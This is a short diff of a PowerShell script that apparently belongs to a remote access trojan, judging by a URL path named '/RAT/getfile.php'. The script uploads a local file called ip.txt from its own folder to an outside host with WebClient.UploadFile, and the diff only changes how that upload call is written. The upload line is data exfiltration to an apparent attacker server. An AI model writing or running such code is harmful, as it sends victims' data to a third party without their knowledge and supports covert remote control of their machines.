@@ -48,4 +48,4 @@ $url = "https://arth.imbeddex.com/RAT/getfile.php"
 $filePath = "$PSScriptRoot\ip.txt"
 
 $client = New-Object System.Net.WebClient
-$bytes = $client.UploadFile($url, $filePath)
+$client.UploadFile($url, $filePath)
